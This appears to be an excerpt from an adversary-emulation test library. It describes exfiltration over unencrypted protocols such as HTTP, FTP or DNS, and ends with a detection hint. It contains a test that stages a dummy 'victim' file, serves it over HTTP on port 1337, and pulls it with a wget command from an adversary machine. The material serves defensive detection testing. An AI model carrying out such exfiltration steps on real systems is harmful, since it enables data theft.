    "Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nAdversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields. "

    "### Atomic Test #1 - Exfiltration Over Alternative Protocol - HTTP\nA firewall rule (iptables or firewalld) will be needed to allow exfiltration on port 1337.\n\nUpon successful execution, sh will be used to make a directory (/tmp/victim-staging-area), write a txt file, and host the directory with Python on port 1337, to be later downloaded.\n\n**Supported Platforms:** macos, linux\nRun it with these steps!\n1. Victim System Configuration:\n\n    mkdir /tmp/victim-staging-area\n    echo \"this file will be exfiltrated\" > /tmp/victim-staging-area/victim-file.txt\n\n2. Using Python to establish a one-line HTTP server on victim system:\n\n    cd /tmp/victim-staging-area\n    python -m SimpleHTTPServer 1337\n\n3. To retrieve the data from an adversary system:\n\n    wget http://VICTIM_IP:1337/victim-file.txt\n"

Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.
